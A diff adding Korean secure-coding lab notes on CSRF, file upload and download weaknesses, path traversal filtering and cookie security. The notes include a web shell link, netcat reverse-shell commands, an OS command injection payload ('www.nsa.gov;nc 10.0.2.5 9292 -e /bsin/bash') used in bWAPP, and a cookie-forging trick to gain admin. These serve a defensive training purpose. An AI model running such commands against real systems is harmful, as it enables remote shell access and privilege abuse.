@@ -358,3 +358,144 @@ http://localhost:3000/hook.js
 Wade Alcorn 부터 hook.js. 위쪽은 jQuery Library
 https://www.yes24.com/product/goods/14788168
 브라우저 해킹 vs 보안 - 웨이드 알콘
+
+* 중요기능
+  - 계좌이체
+  - 패스워드 변경
+  - 과금
+
+* 캡챠 기능
+  - 자동화된 요청을 방지
+  - CSRF 방어
+  - 요청 처리 절차에 사람이 관여하도록
+
+* '참가신청'이 자동으로 처리되지 않도록 수정 => CSRF 취약점을 방어
+  p78, p79
+
+* request.getParameter(...); 가 null 을 반환하는 경우
+  - QueryString 에 없는 경우
+
+* Spring Framework, Python Django 는 csrf 토큰을 자동으로 해줌
+
+* 토큰은 일시적인 권한을 부여하고 상징함
+
+---
+
+파일 업로드/다운로드 보안약점
+
+
+* 파일 업로드
+시스템 외부에 있는 파일이 시스템 내부로 들어가는 것
+파일의 크기와 개수, 종류를 제한해야 한다.
+
+* 파일의 크기와 개수 제한. 제한하지 않으면,
+시스템 연결자원, 디스크 자원 고갈 시켜 정상적인 서비스를 방어할 수 있다.
+
+* 종류 제한. 제한하지 않으면,
+  - 악성 코드도 올리 수 있다.
+
+* open web shell project
+  - 파일의 종류를 체크하지 않는다.
+
+* https://github.com/tennc/webshell/blob/master/jsp/1.jsp
+
+* "/bin/bash -c "
+  - -c : 명령을 실행한 후 종료
+
+* 파일을 종류를 제한하고 있는지 보고싶다.
+  -> 파일에서 실행가능한 파일을 업로드하려고 한다.
+  -> 파일의 종류를 제한하고 있지 않음을 확인.(jsp 로드 해봄)
+
+* Content-type 으로 파일을 판단하는 방법은 좋은 방법은 아니다.
+
+* https://www.garykessler.net/library/file_sigs.html
+  - File Signature. Magic Number.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+  - .class: CA FE BA BE ~ (null)
+  - .jpg: FF D8 ~ FF D9
+
+* Reverse Shell
+
+$ nc -lvp 8282
+nc -lvp 8282 -e /bin/bash -> 웹 1.jsp 에서 입력
+ls ; nc 10.0.2.5 8282 -e /bsin/bash -> 웹 1.jsp 에서 입력 (실패함)
+
+실패하고 bWAPP 에서 시도
+
+10.0.2.4/bWAPP/login.php
+bug:bug
+
+OS Command Injection
+DNS lookup: www.naver.com <- 도메인의 정보를 가져옴
+DNS lookup: ... ; ls <-
+DNS lookup: www.nsa.gov;nc 10.0.2.5 9292 -e /bsin/bash
+
+연결성공
+
+* 업로드 취약점 막는 방법
+
+* UploadController Line 79
+  - 파일의 크기 등을 체크하고 있지 않다.
+
+
+* WebConfig.java
+  - www.nsa.gov;nc 10.0.2.5 9292 -e /bsin/bash
+
+* UploadController.java
+
+(생략)
+
+$ sudo mkdir -p /temp/upload
+$ sudo chown kali:kali /temp/upload
+
+* 업로드 취약점을 개선하면,
+  다운로드 기능이 있어야 한다.
+
+* 경로 조작 취약점 : 외부 입력값을 파일의 식별자로 사용하는 경우
+                     외부 입력값에 경로 조작 문자열(., .., /, \) 포함 여부를 확인하지 않고,
+                     파일 식별자로 사용하는 경우에 발생
+
+
+
+* 다운로드시 내가 지정한 경로에서만 내려가도록 해야 함.
+  경로조작 문자열도 검증해야 한다.
+
+* 다운로드 기능에 경로 조작 취약점을 방어
+UploadController.java
+downloadFile(......)
+fileName = fileName.replaceAll("\\.{2,}[/\\\\]", "");
+\\. : 점(.)이라는 문자 그 자체
+{2,} : 반복횟수. 2부터 시작해서 n개
+\\.{2,} : .., ..., ...., 등
+[/\\\\] : / 또는 \
+\\\\: 역슬래시 1개. 정규식 이스케이프를 위해 \ 붙이고, Java에서 이스케이프 위에 \ 또 붙임.
+
+* 파일이 없으면 0Byte 가 떨어짐.
+
+* 사용자가 업로드한 파일 다운
+  관리자가 제공하는 파일: 입사지원 양식
+
+* 
+  잘 관리: 도난 당하더라도 피해가 최소화 되도록
+
+* 인증기능은 시도횟수 제한해야 한다.
+
+* localhost:8080/admin/registList 로 접근했더니, 로그인 페이지로 이동
+
+* 개발자 도구 > Console
+> document.cookie="userRole=ADMIN"
+
+-> 서버는 쿠키를 이용하여 관리자임을 판단
+
+* 쿠키에는 중요한 정보를 담으면 안되고,
+  쿠키에 담은 정보는 암호화 해야 한다.
+  -> 쿠키는 서버가 클라이언트에 남기는 자취.
+     클라이언트에서는 풀어볼 이유가 없다.
+
+* HTTP-Only : 브라우저 단에서 스크립트 코드로 쿠키를 액세스 할 수 없도록 막아주는 속성
+  Secure : 내가 내려주는 쿠키를 https 와같은 보안통신을 통해서만 나에게 넘어오도록 제한.
+  쿠키의 유효기간과 지속시간을 최소한으로 잡는다.
+
+
+
+
+
